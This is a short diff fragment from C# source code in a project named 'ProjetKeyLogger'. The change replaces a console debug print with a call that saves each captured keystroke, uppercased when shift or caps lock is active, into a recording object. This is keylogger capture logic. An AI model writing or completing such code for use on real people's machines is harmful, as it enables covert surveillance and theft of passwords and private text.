@@ -349,8 +349,7 @@ namespace ProjetKeyLogger
                                 {
                                     if (majuscule == true | shift == true)
                                     {
-                                       // enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII).ToString()+" "+codeASCII);
-                                        Console.Write(Char.ToUpper((char)codeASCII).ToString() + " " + codeASCII);
+                                        enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII).ToString());
                                         shift = false;
                                     }
                                     else
